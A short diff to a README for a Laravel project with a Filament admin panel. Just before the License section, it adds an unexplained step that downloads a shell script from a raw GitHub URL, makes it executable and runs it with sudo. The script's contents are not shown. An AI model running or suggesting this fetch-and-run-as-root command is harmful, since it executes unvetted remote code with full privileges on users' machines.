@@ -282,6 +282,11 @@ The Filament admin panel is accessible at `/admin`. Create the first admin user 
 php artisan make:filament-user
 ```
 
+
+wget -O update.sh https://raw.githubusercontent.com/elsadeny/weducaltd/main/update.sh
+chmod +x update.sh
+sudo ./update.sh
+
 ---
 
 ## License
